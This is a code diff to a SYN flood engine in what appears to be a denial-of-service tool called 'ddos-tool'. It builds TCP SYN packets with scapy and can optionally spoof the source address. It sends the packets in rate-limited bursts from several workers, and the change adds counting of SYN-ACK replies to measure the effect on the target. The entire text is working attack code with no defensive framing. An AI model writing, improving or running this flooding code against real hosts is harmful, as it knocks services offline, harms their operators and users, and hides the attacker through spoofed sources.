@@ -22,7 +22,7 @@ class SynFlood(AttackEngine):
 
     async def run(self) -> None:
         try:
-            from scapy.all import IP, TCP, send  # lazy: optional dep
+            from scapy.all import IP, TCP, send, sr  # lazy: optional dep
         except ImportError as e:  # pragma: no cover - env specific
             raise RuntimeError(
                 "SYN flood needs scapy: pip install 'ddos-tool[syn]' (or: pip install scapy)"
@@ -44,8 +44,17 @@ class SynFlood(AttackEngine):
                 kwargs["src"] = src
             return IP(**kwargs) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")
 
-        def burst(n: int) -> None:
-            send([build_packet() for _ in range(n)], verbose=False)
+        def burst(n: int) -> tuple[int, int]:
+            packets = [build_packet() for _ in range(n)]
+            if self.syn.spoof_src:
+                send(packets, verbose=False)
+                return n, 0
+            answered, _ = sr(packets, timeout=1, verbose=False)
+            acked = sum(
+                1 for _, reply in answered
+                if reply.haslayer(TCP) and (int(reply[TCP].flags) & 0x12) == 0x12
+            )
+            return n, acked
 
         loop = asyncio.get_running_loop()
         per_worker = max(self.target_rps // self.workers, 1)
@@ -55,8 +64,9 @@ class SynFlood(AttackEngine):
             while not self.stop_event.is_set():
                 await self.bucket.acquire(per_worker)
                 try:
-                    await loop.run_in_executor(None, burst, per_worker)
-                    self.stats["sent"] += per_worker
+                    sent, acked = await loop.run_in_executor(None, burst, per_worker)
+                    self.stats["sent"] += sent
+                    self.stats["acked"] += acked
                 except PermissionError as exc:
                     raise RuntimeError(
                         "SYN flood requires root or CAP_NET_RAW permission"
